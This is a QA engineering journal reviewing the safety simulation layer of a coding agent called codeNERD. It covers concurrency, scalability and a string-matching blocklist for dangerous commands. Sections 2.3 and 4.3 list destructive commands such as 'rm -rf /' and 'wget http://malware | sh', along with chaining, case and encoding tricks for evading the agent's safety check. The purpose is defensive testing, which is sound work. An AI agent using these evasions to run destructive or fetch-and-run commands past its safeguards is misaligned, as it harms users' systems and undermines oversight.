# Quality Assurance Journal: Boundary Value Analysis of Dreamer Subsystem
**Date:** 2026-02-06 00:19:42 EST
**Author:** QA Automation Engineer (Jules)
**Target System:** `internal/core/dreamer.go`
**Scope:** Boundary Value Analysis, Negative Testing, Safety Verification

## 1. Executive Summary

The `Dreamer` subsystem serves as the "Precog Safety Layer" for the codeNERD agent. Its primary responsibility is to simulate proposed actions (like file edits, command executions) against a cloned Mangle kernel *before* they are executed. This simulation aims to detect `panic_state` derivations—logical deductions that indicate an action violates safety policies (e.g., modifying critical files, executing dangerous commands).

As a critical safety component, `Dreamer` must be robust against:
1.  **Evasion**: Cleverly constructed inputs that bypass checks.
2.  **Denial of Service (DoS)**: Inputs that cause excessive resource consumption during simulation.
3.  **Concurrency Bugs**: Race conditions that could lead to using a stale or nil kernel.
4.  **False Negatives**: Failing to flag truly dangerous actions due to logic gaps.

This review identifies significant gaps in the current test suite (`internal/core/dreamer_test.go`) and the implementation itself, particularly regarding boundary values and extreme inputs.

## 2. System Analysis & Code Review Findings

### 2.1 Concurrency & State Management
The `Dreamer` struct holds a pointer to `RealKernel`.
```go
type Dreamer struct {
    kernel *RealKernel
}
```
The `SetKernel` method updates this pointer without any mutex protection:
```go
func (d *Dreamer) SetKernel(kernel *RealKernel) {
    d.kernel = kernel
}
```
The `SimulateAction` method reads this pointer and calls `Clone()`:
```go
func (d *Dreamer) evaluateProjection(...) {
    clone := d.kernel.Clone() // READ
}
```
**Finding:** There is a Race Condition. If `SetKernel` is called concurrently with `SimulateAction` (e.g., during a kernel hot-reload or context switch), the read of `d.kernel` might occur while the pointer is being written, or worse, the `RealKernel` pointed to might be in an invalid state if it's being torn down. While Go pointer writes are often atomic, the lack of synchronization is a "State Conflict" vector. This is particularly dangerous in a long-running server environment where configuration updates might trigger kernel swaps.

**Reproduction Snippet:**
```go
go func() {
    for {
        d.SetKernel(newKernel())
    }
}()
go func() {
    for {
        d.SimulateAction(ctx, req) // Potential PANIC or partial read
    }
}()
```

### 2.2 Performance & Scalability (The Massive Input Vector)
The `codeGraphProjections` method performs a full scan of the code graph:
```go
defs, err := d.kernel.Query("code_defines") // LOAD ALL DEFINITIONS
// ...
callFacts, err := d.kernel.Query("code_calls") // LOAD ALL CALLS
```
In a large repository (monorepo with millions of lines):
- `code_defines` could contain 100,000+ facts.
- `code_calls` could contain 1,000,000+ facts.
These are loaded into Go memory as a slice of `Fact` structs for *every* simulated action that touches a file.

**Finding:** This is a Denial of Service (DoS) vector. A user working on a large codebase who asks the agent to edit a core file could trigger a `SimulateAction` call that consumes GBs of RAM and hangs the CPU, potentially crashing the agent (OOM).

**Impact Analysis:**
- **Memory**: 1M facts * ~100 bytes/fact = ~100MB per request. Concurrent requests multiply this.
- **CPU**: Iterating 1M items in Go is fast, but doing it on every file edit is wasteful. The filtering logic `filepath.Clean(file) == filepath.Clean(path)` runs `filepath.Clean` (which involves allocation and parsing) inside the loop. This is $O(N * M)$ complexity where N is facts and M is file edits.

### 2.3 Hardcoded Safety Lists (The Evasion Vector)
The `isDangerousCommand` function uses a hardcoded blocklist:
```go
dangerous := []string{
    "rm -rf", "rm -r", "git reset --hard", "terraform destroy", "dd if=",
}
```
**Finding:** This approach is fragile and easily evaded. It represents a "Security through Obscurity" mindset that fails against adversarial inputs or even accidental misuse.

**Evasion Techniques:**
- **Case Sensitivity**: `RM -rf` (if the shell supports it or aliases exist).
- **Obfuscation**: `rm -r -f` (argument splitting), `rm \ -rf` (line continuation).
- **Missing Commands**: `mv / /dev/null`, `: > file`, `wget http://malware | sh`.
- **Chaining**: `echo hello; rm -rf /`. The `strings.Contains` check works for simple substrings but fails to understand command structure. If I run `echo "don't rm -rf me"`, it triggers a false positive. If I run `eval $(base64 -d ...)` it triggers a false negative.

### 2.4 Null/Empty Handling
The `projectEffects` function trims the target path:
```go
path := strings.TrimSpace(req.Target)
```
If `req.Target` is empty or whitespace, `path` becomes `""`.
The `criticalPrefix` check returns `""` for empty paths.
The projections generated will be `projected_action(ID, TYPE, "")`.

**Finding:** While not immediately fatal, this allows actions with empty targets to proceed to simulation. If the Mangle policy doesn't explicitly handle empty strings (e.g., `file_exists("")` might not match anything), valid safety rules might be bypassed. A rule like `panic_state(ID, "bad file") :- projected_action(ID, _, File), forbidden(File).` will fail if `forbidden("")` is not derived.

## 3. Boundary Value Analysis (BVA)

We define the following boundary vectors for testing:

### 3.1 Vector A: Null, Undefined, and Empty Inputs
| Input Field | Value | Expected Behavior | Potential Failure | Risk Level |
|-------------|-------|-------------------|-------------------|------------|
| `ActionRequest.Target` | `""` (Empty String) | Graceful rejection or safe simulation. | `projected_action` created with empty path, bypassing specific file rules. | Low |
| `ActionRequest.Target` | `"   "` (Whitespace) | Same as above. | Same as above. | Low |
| `Dreamer.kernel` | `nil` | `SimulateAction` returns safe immediately. | `evaluateProjection` calling `d.kernel.Clone()` panics if check is missed. | High |
| `ActionRequest.Type` | `""` (Empty Type) | Should be handled as unknown type. | Switch case default behavior (might be "safe"). | Low |

### 3.2 Vector B: Type Coercion & Data Representation
The `toString` helper function:
```go
func toString(arg interface{}) string {
    switch v := arg.(type) {
    case string: return v
    case MangleAtom: return string(v)
    default: return fmt.Sprintf("%v", v)
    }
}
```
| Input Type | Value | Expected Behavior | Potential Failure | Risk Level |
|------------|-------|-------------------|-------------------|------------|
| `Fact.Arg` | `int(123)` | `"123"` | Correct. | Low |
| `Fact.Arg` | `[]byte{0x01}` | `"[1]"` | Mismatch if logic expects hex or raw string. | Medium |
| `Fact.Arg` | `nil` | `"<nil>"` | Mismatch with Mangle `nil` concept (if any). | Medium |
| `Fact.Arg` | `struct{}` | `"{}"` | String representation might vary across Go versions. | Low |

### 3.3 Vector C: Extremes (The "Brownfield Monorepo" Scenario)
| Dimension | Value | Expected Behavior | Potential Failure | Risk Level |
|-----------|-------|-------------------|-------------------|------------|
| `code_defines` Count | 1,000,000 facts | Fast lookup or timeout. | OOM / Timeout / CPU spike. | **Critical** |
| `code_calls` Count | 10,000,000 facts | Fast lookup or timeout. | OOM / Timeout. | **Critical** |
| `Target` Path Length | 10,000 chars | Handled correctly. | Buffer overflows (unlikely in Go) or Truncation. | Low |
| `ActionRequest` Rate | 100/sec | Thread-safe processing. | Race conditions in `DreamCache` or Kernel. | High |

### 3.4 Vector D: State Conflicts & Lifecycle
| State Transition | Scenario | Expected Behavior | Potential Failure | Risk Level |
|------------------|----------|-------------------|-------------------|------------|
| `SetKernel` during `Simulate` | `Simulate` reads ptr, `SetKernel` writes ptr. | Atomic switch or lock wait. | Partial object read (unlikely with ptr) or Use-after-free (if kernel closed). | Medium |
| Kernel Panic | `d.kernel.Query` panics. | `SimulateAction` catches panic. | Crash of entire agent. | High |
| Context Cancel | User cancels request during simulation. | Immediate return, resource cleanup. | Goroutine leak or wasted computation. | Medium |

## 4. Negative Testing Recommendations

The current tests (`dreamer_test.go`) only cover the "Happy Path" (Safe Action) and a "Simple Unsafe Action" (Forbidden File). We must introduce the following Negative Tests:

### 4.1 Test Case: Race Condition Provocation
**Goal:** Verify `Dreamer` remains stable when Kernel is swapped under load.
**Setup:**
- Spawn 10 goroutines calling `SimulateAction` in a loop.
- Spawn 1 goroutine calling `SetKernel` with new kernels in a loop.
**Assertion:** No data races (detected by `-race`) and no panics.
**Proposed Implementation:**
```go
func TestDreamer_RaceCondition(t *testing.T) {
    d, k := setupTestDreamer(t)
    ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
    defer cancel()

    var wg sync.WaitGroup
    wg.Add(11)

    // Writer
    go func() {
        defer wg.Done()
        for {
            select {
            case <-ctx.Done(): return
            default:
                newK, _ := NewRealKernel()
                d.SetKernel(newK)
                time.Sleep(1 * time.Millisecond)
            }
        }
    }()

    // Readers
    for i := 0; i < 10; i++ {
        go func() {
            defer wg.Done()
            for {
                select {
                case <-ctx.Done(): return
                default:
                    d.SimulateAction(context.Background(), ActionRequest{Type: ActionReadFile, Target: "foo"})
                }
            }
        }()
    }
    wg.Wait()
}
```

### 4.2 Test Case: The "Million Line Repo" Simulation
**Goal:** Verify `codeGraphProjections` does not crash on massive datasets.
**Setup:**
- Inject 100,000 `code_defines` facts into the kernel.
- Inject 100,000 `code_calls` facts.
**Action:** Call `SimulateAction` for a file that is "popular" (referenced by many).
**Assertion:** Execution time < 500ms (or reasonable bound), no OOM.

### 4.3 Test Case: Dangerous Command Evasion
**Goal:** Verify robustness of `isDangerousCommand`.
**Inputs:**
- `"rm -r -f /"` (Argument reordering)
- `"RM -rf /"` (Case variation)
- `"/bin/rm -rf /"` (Path prefix)
- `"eval 'rm -rf /'"` (Shell masking)
**Assertion:** All should be flagged as `Unsafe` or at least project `/exec_danger`.
**Proposed Implementation:**
```go
func TestDreamer_Evasion(t *testing.T) {
    vectors := []string{
        "rm -r -f /",
        "RM -rf /",
        "/bin/rm -rf /",
        "echo foo; rm -rf /",
    }
    for _, v := range vectors {
        if !isDangerousCommand(v) {
            t.Errorf("Failed to detect dangerous command: %s", v)
        }
    }
}
```

### 4.4 Test Case: Nil Kernel Resilience
**Goal:** Verify `Dreamer` handles nil kernel gracefully in deep call stacks.
**Setup:**
- Create `Dreamer` with `nil` kernel.
- Call `SimulateAction`.
- *Variant:* Create `Dreamer` with valid kernel, then set to `nil` immediately before `evaluateProjection` is reached (requires breakpoints or mocks).

## 5. Risk Matrix

| Risk ID | Description | Likelihood | Impact | Severity | Priority |
|---------|-------------|------------|--------|----------|----------|
| R-01 | **DoS via Massive Repo**: Agent crashes OOM when analyzing large codebases. | High | Critical | **Critical** | P0 |
| R-02 | **Safety Evasion**: User/Attacker bypasses `rm -rf` check via syntax tricks. | Medium | Critical | **High** | P0 |
| R-03 | **Race Condition**: Panic during kernel hot-swap. | Low | High | **Medium** | P1 |
| R-04 | **Empty Path Bypass**: Rules targeting specific files are bypassed by empty target. | Low | Medium | **Low** | P2 |
| R-05 | **False Positive Block**: Safe commands like `echo "rm -rf"` are blocked. | High | Low | **Low** | P2 |

## 6. Mitigation Strategies

### 6.1 Architectural Fixes
1.  **Mutex Protection**: Add `sync.RWMutex` to `Dreamer` to protect the `kernel` pointer.
    ```go
    type Dreamer struct {
        mu     sync.RWMutex
        kernel *RealKernel
    }
    func (d *Dreamer) SetKernel(k *RealKernel) {
        d.mu.Lock()
        defer d.mu.Unlock()
        d.kernel = k
    }
    func (d *Dreamer) getKernel() *RealKernel {
        d.mu.RLock()
        defer d.mu.RUnlock()
        return d.kernel
    }
    ```
2.  **Streaming/Indexed Queries**:
    - Instead of `Query("code_defines")` (getting all), use `Query("code_defines", path, "?")` if supported by `RealKernel`.
    - If Mangle doesn't support indexed arguments in Go API, implement a "Virtual Predicate" or "Built-in" that does the filtering on the logic side, not the Go side.
    - Example Mangle Rule change:
      ```mangle
      // Instead of Go code iterating everything, define a rule:
      relevant_symbol(Sym) :- code_defines("/path/to/target", Sym).
      ```
      Then query `relevant_symbol(Sym)`. This offloads the filtering to the engine, which is optimized for it.

3.  **Robust Command Parsing**: Use a shell parser (like `mvdan.cc/sh`) to analyze commands structurally instead of string matching.
    - Walk the AST to find `Rm` nodes.
    - Check flags strictly.

4.  **Configuration-Driven Safety**: Move the "dangerous commands" and "critical prefixes" lists into `agents.json` or a Mangle policy file (`safety.mg`) so they can be updated without recompiling.
    - This allows "Hot Patching" safety rules.

### 6.2 Test Suite Improvements
- Implement the "Million Fact" benchmark test using `testing.Benchmark`.
- Implement the Race Condition test using `testify` and `-race`.
- Use a "Fuzz Testing" approach for command inputs to find evasion strings.

## 7. Implementation Plan (Test Gaps)

We have annotated `internal/core/dreamer_test.go` with the following gaps:

```go
// TODO: TEST_GAP: Boundary Value - Massive Inputs
// The current implementation of codeGraphProjections performs a full table scan
// of 'code_defines' and 'code_calls'. We need a test that injects 100k+ facts
// to verify this doesn't OOM or timeout on large repositories.
// Implementation Tip: Use a helper to generate facts programmatically.

// TODO: TEST_GAP: State Conflict - Race Condition
// Dreamer.SetKernel and Dreamer.SimulateAction access the kernel pointer without
// synchronization. A concurrent test is needed to prove safety during kernel updates.
// Implementation Tip: Use strict goroutine synchronization to force the race.

// TODO: TEST_GAP: Boundary Value - Null/Empty/Whitespace
// Verify behavior when ActionRequest.Target is empty, whitespace, or invalid.
// Should ensure critical_path_hit is not falsely triggered or bypassed.

// TODO: TEST_GAP: Negative Testing - Dangerous Command Evasion
// The isDangerousCommand check is simple string matching. We need to test:
// 1. Case variations ("RM -rf")
// 2. Argument reordering ("rm -r -f")
// 3. Path qualification ("/bin/rm")
// 4. Shell obfuscation
// 5. Chained commands ("echo safe; rm -rf /")

// TODO: TEST_GAP: Boundary Value - Nil Kernel Resilience
// Verify that Dreamer handles a nil kernel gracefully, especially if the kernel
// becomes nil between checks in the SimulateAction pipeline.
```

## Appendix A: Proposed Safety Policy (Mangle)

To move away from hardcoded Go lists, we propose a `safety.mg` policy that defines dangerous patterns declaratively.

```mangle
# safety.mg - Proposed Mangle Policy for Safety

# Define dangerous command tokens
dangerous_token("rm").
dangerous_token("dd").
dangerous_token("mkfs").

# Define dangerous flags
dangerous_flag("-rf").
dangerous_flag("--force").

# Rule: Detect dangerous command execution
# If the command string contains a dangerous token AND a dangerous flag
panic_state(ID, "dangerous_command_heuristic") :-
    projected_action(ID, /exec_cmd, Cmd),
    dangerous_token(Token),
    fn:string_contains(Cmd, Token),  # Note: Requires hypothetical string function
    dangerous_flag(Flag),
    fn:string_contains(Cmd, Flag).

# Rule: Detect modification of critical files
# Using the existing file_topology from schemas_world.mg
panic_state(ID, "critical_file_mod") :-
    projected_action(ID, _, Path),
    critical_path(Prefix),
    fn:string_has_prefix(Path, Prefix).

# Critical paths defined in logic, editable at runtime
critical_path("internal/core").
critical_path("internal/mangle").
critical_path(".git").
```

This approach allows us to update safety rules by pushing new atoms/rules to the kernel, without recompiling the Go binary.

## Appendix B: Performance Benchmark Plan

We need to establish a baseline for `SimulateAction` performance.

```go
func BenchmarkSimulateAction_LargeGraph(b *testing.B) {
    // 1. Setup Kernel with 1M facts
    k, _ := NewRealKernel()
    facts := generateMassiveCodeGraph(1_000_000)
    for _, f := range facts {
        k.AssertWithoutEval(f)
    }
    k.Evaluate() // Establish baseline state

    d := NewDreamer(k)
    req := ActionRequest{Type: ActionEditFile, Target: "popular_file.go"}

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        d.SimulateAction(context.Background(), req)
    }
}
```

**Success Criteria:**
- p99 Latency < 100ms.
- Allocation < 10MB per op.
- No linear degradation with graph size.

## 9. Version History

| Version | Date | Author | Description |
|---------|------|--------|-------------|
| 1.0     | 2026-02-06 | Jules | Initial Draft. |
| 1.1     | 2026-02-06 | Jules | Expanded with code samples, risk matrix, and appendixes for Mangle policy proposals. Added specific reproduction snippets for concurrency bugs. |

## 8. Conclusion

The `Dreamer` subsystem is conceptually sound but implementation-wise fragile. The reliance on full-table scans for code graph analysis is a ticking time bomb for scalability. The lack of mutex protection is a classic concurrency bug waiting to happen. And the string-based command safety checks are insufficient for a security-critical component.

Addressing these gaps requires not just better tests, but a refactoring of how the `Dreamer` interacts with the `Mangle` kernel (pushing logic down to the engine) and how it handles concurrency. The tests outlined in this journal will serve as the guardrails for that refactoring.
